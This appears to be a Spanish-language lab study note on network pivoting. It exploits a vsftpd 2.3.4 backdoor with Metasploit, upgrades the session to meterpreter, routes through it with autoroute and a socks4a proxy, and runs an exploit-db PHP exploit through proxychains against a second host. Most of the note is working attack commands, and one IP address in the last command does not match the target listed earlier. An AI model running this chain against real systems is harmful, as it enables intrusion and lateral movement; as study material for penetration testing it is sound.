
Para ver el funcionamiento de pivoting se plantea un ejemplo:

Hosts víctima:
1. 192.87.244.3
2. 192.18.69.3

Primero vamos a realizar un scan al primer host:

![[Pasted image 20250307091327.png]]

![[Pasted image 20250307091439.png]]

Parece que tenemos un ftp y un servicio ssh.  La versiónd el FTP parace bastante antigua, si buscamos los sploits disponibles podemos dar con alguno.

![[Pasted image 20250307091522.png]]

```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.87.244.3
exploit
```

![[Pasted image 20250307091700.png]]

```bash
#Vamos a poner está sesión de fondo y mejorarla a un meterpreter.
^Z
sessions -u 1
#Con esto podemos mejorar la sesión a un meterpreter.

#Vamos a ver que ip nos interesa analizxar
sessions 2
ipconfig
```

![[Pasted image 20250307091915.png]]

```bash
background
use post/multi/manage/autoroute
set SUBNET 192.18.69.0
set SESSION 2
exploit

#hay que ver que versión socks estamos utilizando con
cat /etc/proxychains.conf
#Esta al final, en el ejmplo es 4

use auxiliary/server/socks4a
#Para saber el server port también está al final del proxychains.conf
set SRVPORT 9050
exploit

#Hay que abrir una nueva tab
proxychains nmap -sT -Pn 192.18.69.3
```

![[Pasted image 20250307093352.png]]

Como no hemos vinculado puertos no podemos entrar en el navegador y observar la web del puerto 80. Pero podemos hacer una consulta por proxychains.

```bash
proxychains curl http://192.18.69.3
```

![[Pasted image 20250307093511.png]]

Parece que existen exploits para la tecnología que está utilizando el servidor web.

```bash
#Vamos a utilizar el primero de esos exploits
cp /usr/share/exploitdb/exploits/php/remote/38730.py .
#Ver funcionamiento
cat 38730.py
proxychains python 38730.py http://182.18.69.3/clipper/ admin password
```

![[Pasted image 20250307093920.png]]
